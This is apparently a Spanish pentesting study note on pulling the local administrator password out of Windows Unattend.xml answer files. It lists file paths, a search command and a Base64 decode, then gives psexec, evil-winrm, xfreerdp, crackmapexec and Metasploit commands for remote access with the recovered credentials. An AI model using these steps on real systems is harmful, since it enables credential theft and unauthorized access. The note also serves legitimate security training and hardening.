# 📂 Persistencia: Extracción de Credenciales en Archivos de Respuesta (Unattend)

Los archivos **Unattend.xml** y **Autounattend.xml** se utilizan durante la instalación automatizada de Windows para configurar el sistema sin intervención humana. El grave riesgo de seguridad es que estos archivos suelen almacenar la **contraseña del Administrador local** para poder finalizar la configuración tras el primer inicio de sesión.
## 🛠️ Metodología de Búsqueda

### 1. Ubicaciones Comunes

Si tienes una shell en el sistema, busca estos archivos manualmente en las rutas donde Windows suele guardarlos o donde los administradores suelen dejarlos tras el despliegue:

- `C:\Windows\Panther\` (La ubicación más común)
- `C:\Windows\Panther\Unattend\`
- `C:\Windows\System32\Sysprep\`
- `C:\unattend.xml`
- `C:\autounattend.xml`

**Comando de búsqueda rápida (CMD):**
- `dir /s *unattend.xml*`
## 🔍 Análisis del Archivo
Busca dentro del XML las etiquetas `<UserAccounts>` o `<AutoLogon>`. Verás algo similar a esto:

 ```
 <UserAccounts>
    <LocalAccounts>
        <LocalAccount wcm:action="add">
            <Password>
                <Value>UEBzc3cwcmQxMjMh</Value>
                <PlainText>false</PlainText>
            </Password>
            <Description>Local Admin</Description>
            <DisplayName>Administrator</DisplayName>
            <Group>Administrators</Group>
            <Name>Administrator</Name>
        </LocalAccount>
    </LocalAccounts>
</UserAccounts>
 ```

Generalmente, encontrarás dos escenarios:

1. **PlainText (true):** La contraseña aparece tal cual.
2. **Base64 (false):** Si `PlainText` es `false`, el valor entre las etiquetas `<Value>` está codificado en **Base64**.

> [!important] **No es cifrado, es codificación:** El Base64 se puede revertir instantáneamente.

**Comando para decodificar en Kali:** 
- `echo "UEBzc3cwcmQxMjMh" | base64 -d` 
- Resultado: `P@ssw0rd123!`
## 🚀 Uso de las Credenciales (Movimiento Lateral / Persistencia)

Una vez obtenida la contraseña del Administrador, el sistema es tuyo. Puedes usarla para ganar acceso persistente o moverte lateralmente si la contraseña se reutiliza en otras máquinas del dominio.

| **Método de Acceso**      | **Herramienta / Comando**                                                                                                                             |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Acceso por Consola**    | [[SMB (Server Message Block Protocol)#🚀 PsExec Ejecución Remota de Comandos\|PsExec]] (`psexec.py Administrator@<IP>`)                               |
| **Interfaz Gráfica**      | [[RDP (Remote Desktop Protocol)#🖥️ Acceso GUI xfreerdp\|RDP]] (`xfreerdp /u:Administrator /p:P@ssw0rd123! /v:<IP>`)                                  |
| **Administración Remota** | [[WinRM (Windows Remote Management Protocol)#2. Ejecución Remota de Comandos (RCE)\|WinRM]] (`evil-winrm -i <IP> -u Administrator -p 'P@ssw0rd123!'`) |
| **Ejecución de Comandos** | [[Crackmapexec]] (`crackmapexec smb <IP> -u Administrator -p 'P@ssw0rd123!' -x 'whoami'`)                                                             |
| **SSH (Si está activo)**  | `ssh Administrator@<IP>`                                                                                                                              |
## 🛠️ Automatización con [[Metasploit]]

Si ya tienes una sesión de Meterpreter, puedes automatizar esta búsqueda con un módulo post-explotación:

- **Módulo:** `post/windows/gather/enum_unattend`
- **Acción:** Este script buscará automáticamente en todas las rutas conocidas, extraerá las credenciales y las decodificará por ti.
## 🚩 Notas de Experto

- **Limpieza:** Como administrador, estos archivos deben eliminarse siempre después del despliegue. Como pentester, es un "Quick Win" que nunca debes saltarte durante la enumeración local.
- **Privilegios:** A veces, estos archivos son legibles por cualquier usuario autenticado (`Users`), lo que los convierte en un vector directo de **Escalada de Privilegios**.

---
**Navegación:**
- Volver a: [[3.3 Obtención Credenciales en Windows]]
- [[Técnicas]]